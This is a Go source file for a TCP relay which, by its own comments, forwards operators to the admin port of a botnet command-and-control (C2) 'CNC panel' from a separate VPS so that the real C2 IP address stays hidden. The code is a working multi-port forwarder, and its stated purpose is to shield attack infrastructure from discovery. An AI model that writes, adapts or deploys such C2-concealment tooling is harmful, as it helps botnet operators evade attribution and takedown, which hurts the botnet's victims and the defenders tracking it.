package main

import (
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================================
// ADMIN RELAY — TCP forwarder for the telnet CNC panel
//
// Sits between admin users and the real C2 server so users never see
// the actual C2 IP address. Pure bidirectional TCP pipe, no protocol
// awareness — works with any telnet/raw-TCP client.
//
// Deploy on a separate VPS. Users connect here; traffic is forwarded
// to the real C2 admin port transparently.
//
// Usage:
//   ./admin_relay -listen 420,1337,9999 -backend <c2_ip>:420
// ============================================================================

var (
	listenPorts string
	backendAddr string

	activeConns int64
	totalConns  uint64
	totalBytes  uint64
	startTime   time.Time
)

func main() {
	flag.StringVar(&listenPorts, "listen", "420", "Comma-separated ports to listen on (e.g. 420,1337,9999)")
	flag.StringVar(&backendAddr, "backend", "", "Real C2 address:port to forward to (e.g. 10.0.0.5:420)")
	flag.Parse()

	if backendAddr == "" {
		fmt.Fprintln(os.Stderr, "Error: -backend is required (e.g. -backend 10.0.0.5:420)")
		os.Exit(1)
	}

	startTime = time.Now()

	ports := strings.Split(listenPorts, ",")
	if len(ports) == 0 {
		fmt.Fprintln(os.Stderr, "Error: at least one listen port required")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	for _, p := range ports {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		addr := ":" + p
		wg.Add(1)
		go func(a string) {
			defer wg.Done()
			startListener(a)
		}(addr)
	}

	fmt.Printf("[RELAY] Admin relay started — %d port(s) → %s\n", len(ports), backendAddr)
	wg.Wait()
}

func startListener(addr string) {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[RELAY] Failed to listen on %s: %v\n", addr, err)
		return
	}
	defer listener.Close()

	fmt.Printf("[RELAY] Listening on %s → %s\n", addr, backendAddr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[RELAY] Accept error on %s: %v\n", addr, err)
			continue
		}
		go handleConn(conn)
	}
}

func handleConn(client net.Conn) {
	atomic.AddInt64(&activeConns, 1)
	atomic.AddUint64(&totalConns, 1)
	clientAddr := client.RemoteAddr().String()
	fmt.Printf("[RELAY] New connection from %s\n", clientAddr)

	defer func() {
		client.Close()
		atomic.AddInt64(&activeConns, -1)
		fmt.Printf("[RELAY] Disconnected: %s\n", clientAddr)
	}()

	// Connect to real C2
	backend, err := net.DialTimeout("tcp", backendAddr, 10*time.Second)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[RELAY] Failed to connect to backend %s: %v\n", backendAddr, err)
		return
	}
	defer backend.Close()

	// Bidirectional pipe
	var wg sync.WaitGroup
	wg.Add(2)

	// client → backend
	go func() {
		defer wg.Done()
		n, _ := io.Copy(backend, client)
		atomic.AddUint64(&totalBytes, uint64(n))
		backend.(*net.TCPConn).CloseWrite()
	}()

	// backend → client
	go func() {
		defer wg.Done()
		n, _ := io.Copy(client, backend)
		atomic.AddUint64(&totalBytes, uint64(n))
		client.(*net.TCPConn).CloseWrite()
	}()

	wg.Wait()
}
